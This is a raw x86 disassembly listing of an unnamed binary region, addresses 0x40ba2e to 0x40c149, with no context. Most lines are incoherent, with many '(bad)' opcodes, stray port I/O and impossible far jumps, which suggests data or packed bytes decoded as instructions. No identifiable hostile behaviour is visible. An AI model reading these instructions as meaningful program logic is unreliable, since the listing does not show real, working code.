  40ba2e:	imul   edi,DWORD PTR [edx+0x46],0x8c0b0eb2
  40ba35:	iret   
  40ba36:	push   cs
  40ba37:	pop    edx
  40ba38:	xchg   esp,eax
  40ba39:	ror    BYTE PTR [esi],1
  40ba3b:	jmp    0xb4f6cd3
  40ba40:	xchg   esp,eax
  40ba41:	iret   
  40ba42:	push   cs
  40ba43:	cmp    cl,BYTE PTR [eax+edx*8-0x306bf6f2]
  40ba4a:	push   cs
  40ba4b:	cmp    al,BYTE PTR [eax]
  40ba4d:	add    BYTE PTR [eax],al
  40ba4f:	add    BYTE PTR [eax],al
  40ba51:	mov    WORD PTR [edx-0x70bacbf2],?
  40ba57:	jl     0x40ba65
  40ba59:	dec    edx
  40ba5a:	pushf  
  40ba5b:	and    BYTE PTR ds:0x2a0e8638,al
  40ba61:	ds (bad) 
  40ba63:	ins    DWORD PTR es:[edi],dx
  40ba64:	adc    eax,0x606fef
  40ba69:	xchg   DWORD PTR [eax+0x7c],edi
  40ba6c:	outs   dx,DWORD PTR ds:[esi]
  40ba6d:	(bad)  
  40ba6e:	jge    0x40bad9
  40ba70:	outs   dx,BYTE PTR ds:[esi]
  40ba71:	jne    0x40bae2
  40ba73:	bound  ebp,QWORD PTR [edi-0x66]
  40ba76:	ja     0x40ba86
  40ba78:	add    BYTE PTR ds:0x3b747b74,dh
  40ba7e:	jp     0x40baf5
  40ba80:	inc    ebp
  40ba81:	dec    edi
  40ba82:	and    DWORD PTR [ebp+0x72],0xe
  40ba86:	jnp    0x40bae9
  40ba88:	gs pop edi
  40ba8a:	gs dec esp
  40ba8c:	ins    BYTE PTR es:[edi],dx
  40ba8d:	dec    esi
  40ba8e:	mov    fs,WORD PTR [ebx+0x0]
  40ba91:	inc    ebx
  40ba92:	jne    0x40ba95
  40ba94:	or     dl,BYTE PTR [ebp+0x74]
  40ba97:	bound  esp,QWORD PTR [eax]
  40ba99:	pop    ebx
  40ba9a:	mov    ah,0x7b
  40ba9c:	and    ch,BYTE PTR [edi+edx*1]
  40ba9f:	addr16 dec cx
  40baa2:	je     0x40bb1a
  40baa4:	imul   ebp,DWORD PTR [edx],0xd4222e65
  40baaa:	jge    0x40bad8
  40baac:	and    BYTE PTR [esi],dl
  40baae:	jp     0x40bb2a
  40bab0:	outs   dx,DWORD PTR ds:[esi]
  40bab1:	leave  
  40bab2:	je     0x40bac2
  40bab4:	add    BYTE PTR [eax],al
  40bab6:	add    BYTE PTR [eax],al
  40bab8:	add    BYTE PTR [eax],al
  40baba:	sbb    esi,DWORD PTR [ecx-0x51baff93]
  40bac0:	push   cs
  40bac1:	add    BYTE PTR [ecx+0x4e686b75],ch
  40bac7:	into   
  40bac8:	pop    edi
  40bac9:	push   di
  40bacb:	sbb    eax,0x1d8a2506
  40bad0:	push   es
  40bad1:	fs push esp
  40bad3:	jp     0x40bb03
  40bad5:	das    
  40bad6:	addr16 into 
  40bad8:	sub    al,0x25
  40bada:	push   0xffffffcc
  40badc:	add    DWORD PTR [edx],ecx
  40bade:	mov    ecx,0xce000eb0
  40bae3:	mov    al,0x6b
  40bae5:	add    BYTE PTR [eax-0x6fddf415],dl
  40baeb:	out    dx,al
  40baec:	or     esi,DWORD PTR [ebx-0x70]
  40baef:	out    0xb,eax
  40baf1:	add    BYTE PTR [eax-0x6f90f538],dl
  40baf7:	scas   al,BYTE PTR es:[edi]
  40baf8:	or     dl,BYTE PTR [ebx-0x70]
  40bafb:	sbb    DWORD PTR [eiz*2+0xbe890],ecx
  40bb02:	nop
  40bb03:	out    0xb,eax
  40bb05:	arpl   WORD PTR [eax-0x6ffff3f7],dx
  40bb0b:	push   es
  40bb0c:	adc    al,0x43
  40bb0e:	nop
  40bb0f:	sbb    bl,ch
  40bb11:	aas    
  40bb12:	nop
  40bb13:	mov    dh,0x2e
  40bb15:	inc    ebx
  40bb16:	nop
  40bb17:	dec    edx
  40bb18:	inc    ecx
  40bb19:	je     0x40bad3
  40bb1b:	push   esp
  40bb1c:	pop    edx
  40bb1d:	imul   eax,DWORD PTR [eax],0x0
  40bb23:	stos   BYTE PTR es:[edi],al
  40bb24:	sub    al,BYTE PTR [eax+0x69]
  40bb27:	scas   eax,DWORD PTR es:[edi]
  40bb28:	and    ecx,DWORD PTR [eax+eax*1]
  40bb2b:	nop
  40bb2c:	inc    edi
  40bb2d:	ins    DWORD PTR es:[edi],dx
  40bb2e:	jae    0x40bba9
  40bb30:	sub    BYTE PTR [eax+eax*1],ch
  40bb33:	nop
  40bb34:	mov    bh,BYTE PTR [esi-0x89c6fc1]
  40bb3a:	inc    ecx
  40bb3b:	nop
  40bb3c:	in     eax,0xa3
  40bb3e:	aas    
  40bb3f:	nop
  40bb40:	xchg   ebp,eax
  40bb41:	push   es
  40bb42:	inc    ebx
  40bb43:	nop
  40bb44:	xchg   esi,esi
  40bb46:	inc    ecx
  40bb47:	nop
  40bb48:	jo     0x40baec
  40bb4a:	aas    
  40bb4b:	nop
  40bb4c:	jns    0x40baf0
  40bb4e:	aas    
  40bb4f:	nop
  40bb50:	xchg   esp,eax
  40bb51:	mov    ds:0x5e81903f,al
  40bb56:	je     0x40bb98
  40bb58:	scas   eax,DWORD PTR es:[edi]
  40bb59:	pop    ss
  40bb5a:	das    
  40bb5b:	aas    
  40bb5c:	aam    0x3f
  40bb5e:	cs aaa 
  40bb60:	aam    0x57
  40bb62:	addr16 xor al,0xb2
  40bb65:	add    dl,BYTE PTR [esi]
  40bb67:	xor    eax,DWORD PTR [ebx-0x4d6fe8fe]
  40bb6d:	or     eax,0xdba30450
  40bb72:	push   ss
  40bb73:	mov    bh,0x9b
  40bb75:	lock dec esi
  40bb77:	scas   al,BYTE PTR es:[edi]
  40bb78:	nop
  40bb79:	push   ds
  40bb7a:	push   esi
  40bb7b:	out    dx,eax
  40bb7c:	les    eax,FWORD PTR [edi+edx*2]
  40bb7f:	std    
  40bb80:	ret    
  40bb81:	in     eax,0x3
  40bb83:	nop
  40bb84:	mov    dl,0x1d
  40bb86:	sahf   
  40bb87:	add    BYTE PTR [eax],al
  40bb89:	add    BYTE PTR [eax],al
  40bb8b:	add    BYTE PTR [edi-0x68625a4e],bl
  40bb91:	mov    dl,0x6f
  40bb93:	inc    ebp
  40bb94:	shl    DWORD PTR [edx-0x4d2e36fc],cl
  40bb9a:	add    al,0xc9
  40bb9c:	shl    DWORD PTR [edx-0x4d2e36fc],1
  40bba2:	sbb    al,0x45
  40bba4:	shl    DWORD PTR [edx-0x4d2cbace],cl
  40bbaa:	hlt    
  40bbab:	inc    ecx
  40bbac:	shl    DWORD PTR [edx-0x4d2cc793],cl
  40bbb2:	mov    ch,0x31
  40bbb4:	push   ecx
  40bbb5:	mov    dl,0xc4
  40bbb7:	enter  0xb251,0xc4
  40bbbb:	enter  0xb251,0xc4
  40bbbf:	enter  0xb251,0x95
  40bbc3:	xor    DWORD PTR [ecx-0x4e],edx
  40bbc6:	(bad)  
  40bbc7:	enter  0xb251,0x48
  40bbcb:	es push ecx
  40bbcd:	mov    dl,0xa9
  40bbcf:	(bad)  
  40bbd0:	push   ecx
  40bbd1:	mov    dl,0xfe
  40bbd3:	and    eax,0x3330b251
  40bbd8:	push   ebx
  40bbd9:	mov    dl,0x11
  40bbdb:	cs push ebx
  40bbdd:	mov    dl,0xfb
  40bbdf:	add    edx,DWORD PTR [eax-0x686bf14e]
  40bbe5:	sub    eax,0x24e67f2
  40bbea:	push   ds
  40bbeb:	imul   esp,DWORD PTR [ecx-0x4e],0xffffffce
  40bbef:	add    BYTE PTR cs:[eax],al
  40bbf2:	add    BYTE PTR [eax],al
  40bbf4:	add    ah,ah
  40bbf6:	js     0x40bbb2
  40bbf8:	inc    ebx
  40bbf9:	add    DWORD PTR [esi-0x1c357319],edi
  40bbff:	sbb    eax,0xb0120073
  40bc04:	cs add eax,0x979cfb63
  40bc0a:	aaa    
  40bc0b:	repnz addr16 into 
  40bc0e:	loop   0x40bc2d
  40bc10:	imul   esp,DWORD PTR [ecx+0x2baeceb2],0x6c
  40bc17:	mov    edx,0xed1f568
  40bc1c:	xlat   BYTE PTR ds:[ebx]
  40bc1d:	in     eax,dx
  40bc1e:	ror    DWORD PTR [esi],1
  40bc20:	mov    al,0xb2
  40bc22:	jne    0x40bc32
  40bc24:	jbe    0x40bc7c
  40bc26:	ror    BYTE PTR [esi],cl
  40bc28:	push   0x65f1787f
  40bc2d:	and    al,BYTE PTR [edx]
  40bc2f:	push   ds
  40bc30:	push   edx
  40bc31:	or     BYTE PTR [edx],dl
  40bc33:	adc    BYTE PTR [esi-0x12],cl
  40bc36:	loop   0x40bc3c
  40bc38:	or     BYTE PTR [edi],cl
  40bc3a:	jge    0x40bbbd
  40bc3c:	fadd   DWORD PTR [edx]
  40bc3e:	add    bl,BYTE PTR [esi]
  40bc40:	push   0xaeb0120b
  40bc45:	sub    ebp,DWORD PTR [edx+edi*4+0x40]
  40bc49:	popa   
  40bc4a:	mov    ebp,0xe3a9ece7
  40bc4f:	sbb    eax,0xb0116f73
  40bc54:	or     esp,DWORD PTR cs:[ebx-0x5]
  40bc58:	cmp    BYTE PTR [eax],al
  40bc5a:	add    BYTE PTR [eax],al
  40bc5c:	add    BYTE PTR [eax],al
  40bc5e:	adc    DWORD PTR [edx-0x37],ebp
  40bc61:	addr16 dec ebp
  40bc63:	loop   0x40bc82
  40bc65:	add    BYTE PTR [ebx],ch
  40bc67:	les    ecx,FWORD PTR [esi]
  40bc69:	shl    BYTE PTR [esi+0x5e],0x56
  40bc6d:	mov    ah,0x93
  40bc6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc70:	and    al,0x0
  40bc72:	jno    0x40bc36
  40bc74:	pop    edx
  40bc75:	push   eax
  40bc76:	(bad)  
  40bc77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc78:	and    BYTE PTR [ecx],dh
  40bc7a:	test   eax,0xb8000eb5
  40bc7f:	xchg   ebx,eax
  40bc80:	imul   esp,DWORD PTR [ebp-0x57],0x62
  40bc84:	and    DWORD PTR [eax+ecx*4+0x68],ecx
  40bc88:	addr16 jne 0x40bc13
  40bc8b:	outs   dx,DWORD PTR ds:[esi]
  40bc8c:	imul   edi,DWORD PTR [edx],0xeb559
  40bc92:	mov    edx,0x4c6e6067
  40bc97:	xchg   edx,eax
  40bc98:	jp     0x40bd03
  40bc9a:	inc    esi
  40bc9b:	addr16 xor al,0x20
  40bc9e:	cli    
  40bc9f:	push   0x84c735f
  40bca4:	push   es
  40bca5:	add    ah,bh
  40bca7:	bound  esp,QWORD PTR [edx+0x6d]
  40bcaa:	inc    esi
  40bcab:	and    BYTE PTR [si+0x55],ah
  40bcaf:	imul   ecx,DWORD PTR [esi],0x7a930600
  40bcb5:	popa   
  40bcb6:	add    BYTE PTR [edi+0x59],ah
  40bcb9:	jae    0x40bcc7
  40bcbb:	arpl   WORD PTR [ebp+0x67],cx
  40bcbe:	sbb    al,0x67
  40bcc0:	jp     0x40bd15
  40bcc2:	add    BYTE PTR [eax],al
  40bcc4:	add    BYTE PTR [eax],al
  40bcc6:	add    BYTE PTR ds:0xe6e6563,bl
  40bccc:	mov    ch,0xe
  40bcce:	add    BYTE PTR [edx],bl
  40bcd0:	mov    ch,0x69
  40bcd2:	add    BYTE PTR [edx],cl
  40bcd4:	mov    ch,0x66
  40bcd6:	add    BYTE PTR [ebp+esi*4+0x7a],bl
  40bcda:	add    BYTE PTR [ebp-0x4a],cl
  40bcdd:	pop    edi
  40bcde:	add    BYTE PTR [esi],bh
  40bce0:	mov    dh,0x60
  40bce2:	add    BYTE PTR [eax-0x6f8df535],dl
  40bce8:	jb     0x40bcf4
  40bcea:	jbe    0x40bc7c
  40bcec:	bound  ecx,QWORD PTR [edx]
  40bcee:	ins    BYTE PTR es:[edi],dx
  40bcef:	nop
  40bcf0:	jbe    0x40bcfc
  40bcf2:	addr16 nop
  40bcf4:	jle    0x40bd00
  40bcf6:	add    BYTE PTR [eax-0x6f93f528],dl
  40bcfc:	test   al,0xa
  40bcfe:	bound  edx,QWORD PTR [eax-0x6f93f546]
  40bd04:	lds    ecx,FWORD PTR [edx]
  40bd06:	add    BYTE PTR [eax-0x6f90f553],dl
  40bd0c:	mov    esp,0xbd90610a
  40bd11:	or     bl,BYTE PTR [eax+edx*4+0x19]
  40bd15:	or     al,0x0
  40bd17:	nop
  40bd18:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd1b:	nop
  40bd1c:	inc    ecx
  40bd1d:	or     al,0x0
  40bd1f:	nop
  40bd20:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd23:	nop
  40bd24:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd27:	nop
  40bd28:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd2b:	add    BYTE PTR [eax],al
  40bd2d:	add    BYTE PTR [eax],al
  40bd2f:	add    BYTE PTR [eax-0x6ffff3e7],dl
  40bd35:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd38:	nop
  40bd39:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd3c:	nop
  40bd3d:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd40:	nop
  40bd41:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd44:	nop
  40bd45:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd48:	nop
  40bd49:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd4c:	nop
  40bd4d:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd50:	nop
  40bd51:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd54:	nop
  40bd55:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd58:	nop
  40bd59:	sbb    DWORD PTR [eax+eax*1],ecx
  40bd5c:	nop
  40bd5d:	push   ebp
  40bd5e:	ins    BYTE PTR es:[edi],dx
  40bd5f:	inc    esp
  40bd60:	nop
  40bd61:	mov    dl,0xe5
  40bd63:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  40bd69:	mov    dl,0x36
  40bd6b:	push   edi
  40bd6c:	pop    ebp
  40bd6d:	push   0x63daf738
  40bd72:	pop    ebp
  40bd73:	test   BYTE PTR [edi-0x6dd219f1],dh
  40bd79:	arpl   WORD PTR [ebx+0x5],cx
  40bd7c:	sbb    ecx,DWORD PTR [edx]
  40bd7e:	dec    esi
  40bd7f:	add    al,0x90
  40bd81:	mov    dl,0x25
  40bd83:	pop    ebx
  40bd84:	or     ebx,DWORD PTR ds:0xa4d41991
  40bd8a:	and    eax,0x65021b04
  40bd8f:	ret    0x867e
  40bd92:	mov    dl,0x88
  40bd94:	add    BYTE PTR [eax],al
  40bd96:	add    BYTE PTR [eax],al
  40bd98:	add    BYTE PTR [esi+eax*4-0x2f],ah
  40bd9c:	cld    
  40bd9d:	retf   
  40bd9e:	(bad)  
  40bd9f:	fnsave [edi]
  40bda1:	jle    0x40be06
  40bda3:	push   edx
  40bda4:	dec    eax
  40bda5:	mov    ah,0xa6
  40bda7:	mov    ch,0xc2
  40bda9:	jecxz  0x40bd81
  40bdab:	add    eax,0xf30fe659
  40bdb0:	sti    
  40bdb1:	mov    eax,ds:0xff88e572
  40bdb6:	test   ebx,esp
  40bdb8:	jbe    0x40bd4a
  40bdba:	push   0xa4b01930
  40bdbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdc0:	add    edx,DWORD PTR [eax]
  40bdc2:	or     esp,edi
  40bdc4:	aaa    
  40bdc5:	xchg   edi,eax
  40bdc6:	cmp    edi,DWORD PTR [ecx]
  40bdc8:	lods   al,BYTE PTR ds:[esi]
  40bdc9:	out    0x69,eax
  40bdcb:	jecxz  0x40bdd0
  40bdcd:	outs   dx,DWORD PTR ds:[esi]
  40bdce:	jo     0x40bd8a
  40bdd0:	(bad)  
  40bdd1:	shr    BYTE PTR [edx-0x42],cl
  40bdd4:	lds    edx,FWORD PTR [ebx-0x14716d4e]
  40bdda:	xor    al,BYTE PTR [edx]
  40bddc:	adc    BYTE PTR [esi+0x67],al
  40bddf:	push   cs
  40bde0:	mov    edx,0x835767d2
  40bde5:	xchg   esi,eax
  40bde6:	addr16 fs call 0xe94f7098
  40bded:	adc    esp,DWORD PTR [edx-0x7d]
  40bdf0:	fcmovnbe st,st(2)
  40bdf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdf3:	dec    edx
  40bdf4:	sti    
  40bdf5:	push   ebx
  40bdf6:	mov    dl,0x85
  40bdf8:	das    
  40bdf9:	test   BYTE PTR [ebx],dh
  40bdfb:	idiv   DWORD PTR [esi+0x0]
  40be01:	add    BYTE PTR [edi-0x7e],ah
  40be04:	and    DWORD PTR [eax+ebp*8],0x78ae5e61
  40be0b:	jle    0x40be29
  40be0d:	sub    DWORD PTR [ebp+esi*1-0x3413ea31],ecx
  40be14:	jno    0x40bda7
  40be16:	enter  0x8361,0x24
  40be1a:	cmp    BYTE PTR [ebx],bh
  40be1c:	dec    ecx
  40be1d:	in     eax,dx
  40be1e:	or     BYTE PTR [esi+0x7a],cl
  40be21:	in     eax,0x1c
  40be23:	shl    bl,1
  40be25:	mov    edx,0xe966b6b5
  40be2a:	arpl   WORD PTR [esi],cx
  40be2c:	lock mov ecx,0xb91a0dba
  40be32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be33:	jb     0x40be43
  40be35:	pusha  
  40be36:	cdq    
  40be37:	aaa    
  40be38:	iret   
  40be39:	aad    0x43
  40be3b:	xor    DWORD PTR gs:[edi+esi*8-0x6848109e],0x9bbfef62
  40be47:	or     eax,0x7285a91a
  40be4c:	push   cs
  40be4d:	ins    BYTE PTR es:[edi],dx
  40be4e:	push   ebx
  40be4f:	add    BYTE PTR [edx],0x72
  40be52:	pusha  
  40be53:	push   cs
  40be54:	xor    al,0xa7
  40be56:	pop    DWORD PTR [edi+0x1994590a]
  40be5c:	push   ss
  40be5d:	add    BYTE PTR [ecx],ah
  40be5f:	mov    dl,0x8e
  40be61:	add    cl,bh
  40be63:	push   0x36ef
  40be68:	add    BYTE PTR [eax],al
  40be6a:	add    dh,bl
  40be6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be6d:	cmp    dl,BYTE PTR [edx]
  40be6f:	sub    DWORD PTR [edx-0xd1e8911],esi
  40be75:	sbb    ah,BYTE PTR [eax-0x35]
  40be78:	jno    0x40be88
  40be7a:	xor    bh,cl
  40be7c:	xchg   ebx,eax
  40be7d:	push   eax
  40be7e:	leave  
  40be7f:	jmp    0x40be3b
  40be81:	push   cs
  40be82:	push   esi
  40be83:	inc    edx
  40be84:	inc    ecx
  40be85:	lea    edi,[esi]
  40be87:	mov    ecx,0xb967ffc5
  40be8c:	xor    eax,esi
  40be8e:	call   DWORD PTR [ebx-0x4a]
  40be91:	out    dx,eax
  40be92:	ss out dx,al
  40be94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be95:	cmp    dl,BYTE PTR [edx]
  40be97:	mov    ecx,0x717e8bb6
  40be9c:	mov    cl,0x7a
  40be9e:	or     DWORD PTR [esi],ecx
  40bea0:	enter  0xff06,0x54
  40bea4:	rcr    DWORD PTR [eax+eax*2],1
  40bea7:	jns    0x40be3c
  40bea9:	retf   
  40beaa:	push   ebp
  40beab:	repnz inc edx
  40bead:	(bad)  
  40beae:	in     al,dx
  40beaf:	cmp    DWORD PTR [ebp+0x35dc000e],esi
  40beb5:	loopne 0x40beb2
  40beb7:	out    dx,al
  40beb8:	repz pop ecx
  40beba:	push   edi
  40bebb:	or     ecx,ebx
  40bebd:	clc    
  40bebe:	add    BYTE PTR [ecx],ch
  40bec0:	mov    cl,0x83
  40bec2:	cli    
  40bec3:	into   
  40bec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bec5:	inc    esi
  40bec6:	adc    bh,cl
  40bec8:	mov    al,0x46
  40beca:	cmp    eax,0xeb664
  40becf:	add    BYTE PTR [eax],al
  40bed1:	add    BYTE PTR [eax],al
  40bed3:	add    dh,ah
  40bed5:	ret    0xf63b
  40bed8:	(bad)  
  40bed9:	pop    eax
  40beda:	pop    eax
  40bedb:	mov    ds:0x685eb0f8,eax
  40bee0:	nop
  40bee1:	ja     0x40bf3f
  40bee3:	inc    eax
  40bee4:	nop
  40bee5:	xor    edi,DWORD PTR [eax+0x4d]
  40bee8:	push   eax
  40bee9:	sbb    eax,DWORD PTR [ecx-0x30f2177c]
  40beef:	(bad)  
  40bef0:	js     0x40bf11
  40bef2:	or     eax,0xa42b9000
  40bef7:	add    eax,0x830c1b84
  40befc:	aam    0xb2
  40befe:	mov    edi,esi
  40bf00:	(bad)  
  40bf01:	outs   dx,BYTE PTR ds:[esi]
  40bf02:	dec    eax
  40bf03:	mov    ecx,DWORD PTR [ebp+0x13]
  40bf06:	add    DWORD PTR [eax+edi*4+0x40fecef5],0xabef989e
  40bf11:	inc    ebx
  40bf12:	iret   
  40bf13:	out    0xae,eax
  40bf15:	(bad)  
  40bf16:	or     eax,DWORD PTR [eax]
  40bf18:	or     eax,0xfa20385b
  40bf1d:	sbb    DWORD PTR [eax+eax*4],esp
  40bf20:	nop
  40bf21:	sbb    DWORD PTR [edx+ebp*2],ecx
  40bf24:	xchg   ecx,eax
  40bf25:	scas   eax,DWORD PTR es:[edi]
  40bf26:	or     ch,BYTE PTR [edx-0x6f]
  40bf29:	mov    eax,ds:0x5990000a
  40bf2e:	iret   
  40bf2f:	je     0x40bec9
  40bf31:	test   BYTE PTR [eax],bl
  40bf33:	inc    esp
  40bf34:	sbb    cl,0xa
  40bf37:	add    DWORD PTR [eax],0x0
  40bf3a:	add    BYTE PTR [eax],al
  40bf3c:	add    BYTE PTR [eax-0x6b],bl
  40bf3f:	cmp    BYTE PTR [ecx],dl
  40bf41:	(bad)  
  40bf42:	call   0x720c:0x1990c7cd
  40bf49:	and    al,0xa8
  40bf4b:	retf   0xd65e
  40bf4e:	ret    0x3c9
  40bf51:	nop
  40bf52:	sub    edi,ecx
  40bf54:	adc    al,0xb0
  40bf56:	out    0x4b,eax
  40bf58:	add    al,ah
  40bf5a:	sbb    ah,BYTE PTR [ebx+0x7cb2bdee]
  40bf60:	scas   eax,DWORD PTR es:[edi]
  40bf61:	adc    BYTE PTR [edi],bl
  40bf63:	test   BYTE PTR [edi],0x90
  40bf66:	mov    dl,0x6a
  40bf68:	xchg   bh,ch
  40bf6a:	pop    es
  40bf6b:	add    eax,eax
  40bf6d:	pop    ebp
  40bf6e:	arpl   WORD PTR [ebp-0x1a4d19d5],dx
  40bf74:	add    ebx,DWORD PTR [ebx]
  40bf76:	or     ecx,edi
  40bf78:	adc    eax,0x3a5a048
  40bf7d:	dec    eax
  40bf7e:	int    0xd2
  40bf80:	add    al,0x90
  40bf82:	mov    dl,0x58
  40bf84:	push   esi
  40bf85:	add    DWORD PTR [esi+ecx*8],0x75
  40bf89:	icebp  
  40bf8a:	mov    cl,0xe5
  40bf8c:	push   ebx
  40bf8d:	sub    BYTE PTR [esi+0x38],bl
  40bf90:	inc    esp
  40bf91:	nop
  40bf92:	call   0x896a:0xb2504ebd
  40bf99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf9a:	or     eax,0xb62fbfa1
  40bf9f:	out    0x3,al
  40bfa1:	add    BYTE PTR [eax],al
  40bfa3:	add    BYTE PTR [eax],al
  40bfa5:	add    BYTE PTR [eax-0x64a0629e],dl
  40bfab:	mov    dl,0xe5
  40bfad:	adc    BYTE PTR [ebx-0x5a],0x64
  40bfb1:	mov    esp,0x90dc8676
  40bfb6:	adc    al,0xa
  40bfb8:	jae    0x40bf79
  40bfba:	bound  bp,DWORD PTR [edx-0x67]
  40bfbe:	outs   dx,DWORD PTR ds:[esi]
  40bfbf:	pop    es
  40bfc0:	popa   
  40bfc1:	mov    edi,0x4c5dfb0a
  40bfc6:	sbb    esi,DWORD PTR [edx-0x79f8771b]
  40bfcc:	jmp    0x8019:0x40639029
  40bfd3:	mov    al,ds:0xf21503a5
  40bfd8:	mov    edx,0xf2fce0f
  40bfdd:	aaa    
  40bfde:	push   0x53fba280
  40bfe3:	ins    BYTE PTR es:[edi],dx
  40bfe4:	push   eax
  40bfe5:	xor    bl,dl
  40bfe7:	pop    edx
  40bfe8:	push   cs
  40bfe9:	adc    al,BYTE PTR [eax+eax*8-0x32]
  40bfed:	ins    BYTE PTR es:[edi],dx
  40bfee:	int    0x7e
  40bff0:	sub    eax,0x50dca9b7
  40bff5:	(bad)  
  40bff6:	in     al,dx
  40bff7:	sar    DWORD PTR [ecx-0x2a],0x96
  40bffb:	inc    ebx
  40bffc:	pop    esi
  40bffd:	jmp    0x40bfb4
  40bfff:	xor    eax,0x948a75dd
  40c004:	xor    edi,DWORD PTR [edi+0x2068b988]
  40c00a:	add    BYTE PTR [eax],al
  40c00c:	add    BYTE PTR [eax],al
  40c00e:	add    BYTE PTR [ebp-0x4a],cl
  40c011:	jns    0x40bffd
  40c013:	ret    0x4f4a
  40c016:	das    
  40c017:	rcr    DWORD PTR [edi+0x59],cl
  40c01a:	pop    ds
  40c01b:	inc    edi
  40c01c:	aaa    
  40c01d:	not    BYTE PTR [esi]
  40c01f:	mov    ds:0xc7dcefe7,eax
  40c024:	lahf   
  40c025:	dec    esi
  40c026:	jmp    0x9fcadb35
  40c02b:	sahf   
  40c02c:	outs   dx,BYTE PTR ds:[esi]
  40c02d:	imul   esi
  40c02f:	(bad)  
  40c030:	scas   eax,DWORD PTR es:[edi]
  40c031:	mov    edx,DWORD PTR [ecx+0x6a047edf]
  40c037:	cmp    ebx,ecx
  40c039:	jp     0x40c027
  40c03b:	mov    ch,0x2f
  40c03d:	iret   
  40c03e:	hlt    
  40c03f:	jp     0x40c07e
  40c041:	out    0xba,eax
  40c043:	push   ebx
  40c044:	popa   
  40c045:	push   0x1a098d60
  40c04a:	and    eax,0x6a0e72a2
  40c04f:	or     ecx,DWORD PTR [ecx]
  40c051:	jp     0x40c038
  40c053:	loop   0x40c0b6
  40c055:	out    dx,eax
  40c056:	hlt    
  40c057:	inc    ebx
  40c058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c059:	dec    esi
  40c05a:	add    BYTE PTR [ecx],bh
  40c05c:	cmp    esi,DWORD PTR [eax-0x61c415]
  40c062:	jae    0x40c09a
  40c064:	ror    BYTE PTR [ecx+0x68bddded],1
  40c06a:	mov    edi,esp
  40c06c:	xor    al,0xca
  40c06e:	add    ah,BYTE PTR [edx+0x1bc87]
  40c074:	add    BYTE PTR [eax],al
  40c076:	add    BYTE PTR [eax],al
  40c078:	inc    esi
  40c079:	push   0x6caa8a51
  40c07e:	retf   
  40c07f:	push   ebp
  40c080:	bound  ebx,QWORD PTR [ecx-0x73]
  40c083:	in     al,0x91
  40c085:	cs in  al,0x58
  40c088:	in     eax,dx
  40c089:	mov    ch,0xe
  40c08b:	push   esi
  40c08c:	jb     0x40c0cc
  40c08e:	pop    ecx
  40c08f:	push   0x4e78d1
  40c094:	inc    edx
  40c095:	loopne 0x40c019
  40c097:	dec    esp
  40c098:	lea    esp,[edx-0x51cc811a]
  40c09e:	push   cs
  40c09f:	test   ecx,edi
  40c0a1:	retf   0x8d7e
  40c0a4:	sub    eax,0xa902001a
  40c0a9:	mov    ch,0x5e
  40c0ab:	lea    ebp,[ebp+0x1a]
  40c0ae:	add    al,0x50
  40c0b0:	mov    eax,ss:0xaeb91222
  40c0b6:	cmp    eax,0xffffffea
  40c0b9:	inc    edi
  40c0ba:	icebp  
  40c0bb:	je     0x40c07c
  40c0bd:	cmp    DWORD PTR [esp+0xeb355],eax
  40c0c4:	add    DWORD PTR [ecx],ebx
  40c0c6:	icebp  
  40c0c7:	jmp    esi
  40c0c9:	cmp    dh,BYTE PTR [eax-0x30c5ea8b]
  40c0cf:	push   eax
  40c0d0:	ret    0x82e0
  40c0d3:	dec    esp
  40c0d4:	lea    esp,[edx-0x6a6fbd1a]
  40c0da:	or     al,BYTE PTR [eax]
  40c0dc:	add    BYTE PTR [eax],al
  40c0de:	add    BYTE PTR [eax],al
  40c0e0:	add    BYTE PTR ds:0x261a36db,cl
  40c0e6:	xchg   edi,eax
  40c0e7:	out    0xf,al
  40c0e9:	xchg   edx,eax
  40c0ea:	sbb    ecx,DWORD PTR [eax+edx*1]
  40c0ed:	or     eax,0x9c07e84f
  40c0f2:	adc    BYTE PTR [esp+ecx*4-0x154e2ff1],ah
  40c0f9:	lea    esp,[ebx+0x1b92545f]
  40c0ff:	add    DWORD PTR [ebx+0xe0bac],0xff5b2b90
  40c109:	jge    0x40c132
  40c10b:	push   ds
  40c10c:	inc    eax
  40c10d:	nop
  40c10e:	xchg   esi,eax
  40c10f:	retf   0x2174
  40c112:	and    BYTE PTR [ebx+0x4c0d6414],dh
  40c118:	add    BYTE PTR [eax],bh
  40c11a:	fwait
  40c11b:	or     eax,DWORD PTR [eax]
  40c11d:	nop
  40c11e:	leave  
  40c11f:	mov    cl,0x14
  40c121:	sub    al,0xd
  40c123:	dec    esp
  40c124:	add    BYTE PTR [esi-0x10],al
  40c127:	sbb    BYTE PTR [eax-0x7e],bl
  40c12a:	fisttp DWORD PTR [edx]
  40c12c:	test   eax,edx
  40c12e:	lahf   
  40c12f:	add    DWORD PTR [ebp-0x1b7a4730],edx
  40c135:	in     eax,dx
  40c136:	pop    esp
  40c137:	pop    edi
  40c138:	push   ebp
  40c139:	faddp  st(0),st
  40c13b:	mov    cl,0x73
  40c13d:	mov    ah,0x5
  40c13f:	xchg   ecx,edi
  40c141:	or     esi,DWORD PTR [ebx]
  40c143:	mov    bl,0x14
  40c145:	add    BYTE PTR [eax],al
  40c147:	add    BYTE PTR [eax],al
  40c149:	add    al,ah
